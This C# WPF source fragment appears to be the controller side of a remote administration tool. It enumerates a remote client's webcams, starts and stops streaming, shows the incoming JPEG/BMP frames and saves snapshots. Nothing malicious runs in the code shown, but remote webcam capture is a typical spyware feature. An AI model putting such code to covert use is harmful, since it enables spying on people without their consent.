            var p = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true }; p.Setters.Add(new Setter(Border.BackgroundProperty, hb, "bd")); p.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd")); tp.Triggers.Add(p);
            var d = new Trigger { Property = UIElement.IsEnabledProperty, Value = false }; d.Setters.Add(new Setter(Border.BackgroundProperty, db, "bd")); d.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp")); tp.Triggers.Add(d);
            return new Button { Content = t, Template = tp, Foreground = fg ?? TxB, Cursor = Cursors.Hand, Margin = new Thickness(2), FontSize = 12, FontWeight = FontWeights.SemiBold };
        }

        TextBlock Lbl(string t) => new() { Text = t, Foreground = DmB, FontSize = 12, VerticalAlignment = VerticalAlignment.Center, Margin = new Thickness(4, 2, 4, 2) };
        Border Sep() => new() { Width = 1, Background = new SolidColorBrush(C("ButtonBorderColor")), Margin = new Thickness(4, 2, 4, 2) };
        void ApplyComboTheme(ComboBox combo)
        {
            combo.Resources[SystemColors.WindowBrushKey] = BgB;
            combo.Resources[SystemColors.HighlightBrushKey] = new SolidColorBrush(OkCol);
            combo.Resources[SystemColors.HighlightTextBrushKey] = TxB;
            combo.ItemContainerStyle = CreateComboBoxItemStyle();
        }
        Style CreateComboBoxItemStyle()
        {
            var style = new Style(typeof(ComboBoxItem));
            style.Setters.Add(new Setter(Control.BackgroundProperty, BgB));
            style.Setters.Add(new Setter(Control.ForegroundProperty, TxB));
            style.Setters.Add(new Setter(Control.BorderBrushProperty, BdB));
            var hover = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hover.Setters.Add(new Setter(Control.BackgroundProperty, new SolidColorBrush(SurfLCol)));
            style.Triggers.Add(hover);
            var selected = new Trigger { Property = ComboBoxItem.IsSelectedProperty, Value = true };
            selected.Setters.Add(new Setter(Control.BackgroundProperty, new SolidColorBrush(OkCol)));
            selected.Setters.Add(new Setter(Control.ForegroundProperty, TxB));
            style.Triggers.Add(selected);
            return style;
        }

        void St(string t)
        {
            if (!Dispatcher.CheckAccess()) Dispatcher.BeginInvoke(() => { if (!_disposed) _status.Text = t; });
            else if (!_disposed) _status.Text = t;
        }

        void UpdateButtons(bool streaming)
        {
            if (!Dispatcher.CheckAccess())
            {
                Dispatcher.BeginInvoke(() => UpdateButtons(streaming));
                return;
            }
            if (_disposed) return;
            _streaming = streaming;
            _startBtn.IsEnabled = !streaming;
            _stopBtn.IsEnabled = streaming;
        }

        async void DoStart()
        {
            if (_disposed) return;

            _startBtn.IsEnabled = false;
            _stopBtn.IsEnabled = false;

            if (_devSel.SelectedIndex < 0 && _devSel.Items.Count > 0)
                _devSel.SelectedIndex = 0;

            if (_devSel.SelectedIndex >= 0)
            {
                try { await _context.SendToClient(new byte[] { 0x02, (byte)_devSel.SelectedIndex }); }
                catch
                {
                    _startBtn.IsEnabled = true;
                    St("Failed to select device");
                    return;
                }
            }

            SendQuality();

            try { await _context.SendToClient(new byte[] { 0x03 }); }
            catch
            {
                _startBtn.IsEnabled = true;
                St("Failed to send start command");
                return;
            }

            _fc = 0; _fpc = 0; _bpc = 0; _lastFps = DateTime.UtcNow;
            UpdateButtons(true);
            St("Starting webcam...");
        }

        async void DoStop()
        {
            if (_disposed) return;

            _startBtn.IsEnabled = false;
            _stopBtn.IsEnabled = false;

            try { await _context.SendToClient(new byte[] { 0x04 }); }
            catch { }

            UpdateButtons(false);
            St("Stopped.");
        }

        async void DoRefresh()
        {
            if (_disposed) return;
            try { await _context.SendToClient(new byte[] { 0x01 }); }
            catch
            {
                St("Failed to refresh devices");
                return;
            }
            St("Refreshing devices...");
        }

        async void SendQuality()
        {
            if (_disposed) return;
            int q = (int)_qSlider.Value;
            try { await _context.SendToClient(new byte[] { 0x05, (byte)q }); } catch { }
        }

        void DoSave()
        {
            if (_img.Source == null) return;
            var d = new Microsoft.Win32.SaveFileDialog
            {
                FileName = "webcam_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png",
                Filter = "PNG|*.png|JPEG|*.jpg"
            };
            if (d.ShowDialog() != true) return;
            try
            {
                var s = _img.Source as BitmapSource;
                if (s == null) return;
                BitmapEncoder enc = d.FileName.EndsWith(".jpg", StringComparison.OrdinalIgnoreCase)
                    ? new JpegBitmapEncoder { QualityLevel = 95 }
                    : (BitmapEncoder)new PngBitmapEncoder();
                enc.Frames.Add(BitmapFrame.Create(s));
                using var fs = new FileStream(d.FileName, FileMode.Create);
                enc.Save(fs);
                St("Saved: " + d.FileName);
            }
            catch (Exception ex) { St("Save failed: " + ex.Message); }
        }

        public void HandleServerData(byte[] data)
        {
            if (_disposed || data == null || data.Length == 0) return;
            if (data[0] == 0x30) { HandleJpegFrame(data); return; }
            if (data[0] == 0x31) { HandleBmpFrame(data); return; }
            Dispatcher.BeginInvoke(() =>
            {
                if (_disposed) return;
                try
                {
                    switch (data[0])
                    {
                        case 0x06:
                            HandleDeviceList(data);
                            break;
                        case 0xFD:
                            if (data.Length > 1) Log("[C] " + Encoding.UTF8.GetString(data, 1, data.Length - 1));
                            break;
                        case 0xFE:
                            if (data.Length > 2)
                            {
                                byte ackCmd = data[1];
                                var m = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[OK] cmd=0x" + ackCmd.ToString("X2") + " " + m);
                                St(m);
                                if (ackCmd == 0x03) UpdateButtons(true);
                                else if (ackCmd == 0x04) UpdateButtons(false);
                            }
                            break;
                        case 0xFF:
                            if (data.Length > 2)
                            {
                                byte errCmd = data[1];
                                var m = Encoding.UTF8.GetString(data, 2, data.Length - 2);
                                Log("[ERR] cmd=0x" + errCmd.ToString("X2") + " " + m);
                                St("Error: " + m);
                                if (errCmd == 0x03) UpdateButtons(false);
                            }
                            break;
                    }
                }
                catch { }
            });
        }

        void HandleJpegFrame(byte[] d)
        {
            if (d.Length < 11) return;
            int w = d[1] | (d[2] << 8), h = d[3] | (d[4] << 8);
            int jl = d[5] | (d[6] << 8) | (d[7] << 16) | (d[8] << 24);
            if (w <= 0 || w > 7680 || h <= 0 || h > 4320 || jl <= 2 || 9 + jl > d.Length) return;
            if (d[9] != 0xFF || d[10] != 0xD8) return;

            BitmapImage bmp;
            try
            {
                using var ms = new MemoryStream(d, 9, jl, false);
                bmp = new BitmapImage();
                bmp.BeginInit();
                bmp.CacheOption = BitmapCacheOption.OnLoad;
                bmp.StreamSource = ms;
                bmp.EndInit();
                bmp.Freeze();
            }
            catch { return; }

            _pendingBitmap = bmp;
            _pendingW = w;
            _pendingH = h;
            Interlocked.Add(ref _pendingBytesAccum, d.Length);
            Interlocked.Increment(ref _pendingFrameCount);
            ScheduleRender();
        }

        void HandleBmpFrame(byte[] d)
        {
            if (d.Length < 11) return;
            int w = d[1] | (d[2] << 8), h = d[3] | (d[4] << 8);
            int bl = d[5] | (d[6] << 8) | (d[7] << 16) | (d[8] << 24);
            if (w <= 0 || w > 7680 || h <= 0 || h > 4320 || bl <= 14 || 9 + bl > d.Length) return;

            BitmapImage bmp;
            try
            {
                using var ms = new MemoryStream(d, 9, bl, false);
                bmp = new BitmapImage();
                bmp.BeginInit();
                bmp.CacheOption = BitmapCacheOption.OnLoad;
                bmp.StreamSource = ms;
                bmp.EndInit();
                bmp.Freeze();
            }
            catch { return; }

            _pendingBitmap = bmp;
            _pendingW = bmp.PixelWidth;
            _pendingH = bmp.PixelHeight;
            Interlocked.Add(ref _pendingBytesAccum, d.Length);
            Interlocked.Increment(ref _pendingFrameCount);
            ScheduleRender();
        }

        void ScheduleRender()
        {
            if (_renderScheduled) return;
            _renderScheduled = true;
            Dispatcher.BeginInvoke(() =>
            {
                _renderScheduled = false;
                if (_disposed) return;
                var bmp = _pendingBitmap;
                if (bmp == null) return;
                _pendingBitmap = null;

                int frames = Interlocked.Exchange(ref _pendingFrameCount, 0);
                int bytes = Interlocked.Exchange(ref _pendingBytesAccum, 0);

                _img.Source = bmp;
                _rw = _pendingW;
                _rh = _pendingH;
                _fc += frames;
                _fpc += frames;
                _bpc += bytes;

                var now = DateTime.UtcNow;
                double elapsed = (now - _lastFps).TotalSeconds;
                if (elapsed >= 1.0)
                {
                    double fps = _fpc / elapsed;
                    double mbps = (_bpc * 8.0) / (elapsed * 1000000.0);
                    _fpsLbl.Text = ((int)Math.Round(fps)).ToString() + " fps";
                    _bpsLbl.Text = mbps.ToString("F1") + " Mbps  " + _rw.ToString() + "x" + _rh.ToString();
                    _fpc = 0; _bpc = 0; _lastFps = now;
                }
            }, System.Windows.Threading.DispatcherPriority.Render);
        }

        void HandleDeviceList(byte[] d)
        {
            var info = Encoding.UTF8.GetString(d, 1, d.Length - 1);
            _devices.Clear();
            _suppress = true;
            _devSel.Items.Clear();
            foreach (var line in info.Split('\n'))
            {
                if (string.IsNullOrWhiteSpace(line)) continue;
                var p = line.Split('|');
                if (p.Length < 2) continue;
                int idx = int.TryParse(p[0], out int i) ? i : 0;
                string name = p[1];
                _devices.Add((idx, name));

                var itemBlock = new TextBlock
                {
                    Text = name,
                    Foreground = TxB,
                    FontSize = 12
                };
                _devSel.Items.Add(itemBlock);
            }
            if (_devSel.Items.Count > 0) _devSel.SelectedIndex = 0;
            _suppress = false;
            St(_devices.Count.ToString() + " webcam(s) found");
            Log("[INFO] " + _devices.Count.ToString() + " device(s) enumerated");
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            if (_streaming)
            {
                _streaming = false;
                try { _context.SendToClient(new byte[] { 0x04 }).Wait(500); } catch { }
            }
        }
    }
}
